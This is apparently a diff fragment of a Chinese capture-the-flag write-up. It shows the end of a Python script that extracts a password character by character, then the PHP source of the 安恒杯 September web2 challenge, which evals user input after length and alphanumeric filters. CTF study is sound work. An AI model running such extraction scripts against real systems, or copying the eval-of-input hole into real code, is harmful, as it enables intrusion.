+				#print(data)
+				if 'error' in html:
+					res += j
+					print(res)
+					break
+
+		# 51b7a76d51e70b419f60d3473fb6f900
+
+	password()
+
+
+
+# 安恒杯 9月赛 web2
+	很有意思的一个题，需要极限利用
+	<?php
+	include 'flag.php';
+	if(isset($_GET['code'])){
+		$code = $_GET['code'];
+		if(strlen($code)>40){
+			die("Long.");
+		}
+		if(preg_match("/[A-Za-z0-9]+/",$code)){
+			die("NO.");
+		}
+		@eval($code);
+	}else{
+		highlight_file(__FILE__);
+	}
+	//$hint =  "php function getFlag() to get flag";
 	?>
